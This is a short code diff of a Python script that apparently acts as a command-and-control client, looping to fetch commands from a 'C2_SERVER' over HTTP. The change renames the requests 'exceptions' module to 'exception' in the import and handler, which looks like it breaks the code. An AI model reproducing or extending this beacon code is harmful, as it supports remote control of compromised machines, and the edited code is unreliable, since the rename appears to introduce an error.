@@ -2,7 +2,7 @@
 
 from os import getenv
 from time import sleep, time
-from requests import exceptions, get
+from requests import exception, get
 from sys import platform
 from os import uname
 
@@ -44,7 +44,7 @@ while True:
     try:
         command = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
         print(command.status_code)
-    except exceptions.RequestException:
+    except exception.RequestException:
         print("Server is down.")
         sleep(DELAY)
         continue
